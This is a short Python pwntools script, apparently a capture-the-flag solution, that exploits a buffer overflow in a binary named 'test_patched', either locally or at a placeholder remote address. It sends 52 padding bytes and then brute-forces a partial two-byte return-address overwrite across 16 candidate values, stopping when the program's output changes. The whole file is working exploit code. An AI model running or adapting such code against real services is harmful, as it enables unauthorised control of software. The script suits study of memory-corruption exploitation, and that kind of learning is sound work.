#!/usr/bin/env python3

from pwn import *

exe = ELF("./test_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, """
            b * vulnerable + 98
            c
                    """)
    else:
        r = remote("addr", 1337)

    return r

r = conn()
def test(payload):
    r.sendafter("> ", payload)
    check = r.recv(4)
    if not b"Reco" in check:
        print(check + r.recvline())
        sys.exit("Found")

def main():
    for a in range(16):
        a = hex(a)[2:] # getting the hex character without 0x
        address = f"0x{a}299"
        print(address)
        payload = flat(
            "A" * 52,
            p16(int(address, 16))
        )
        print(payload)
        test(payload)



    # good luck pwning :)

    


if __name__ == "__main__":
    main()
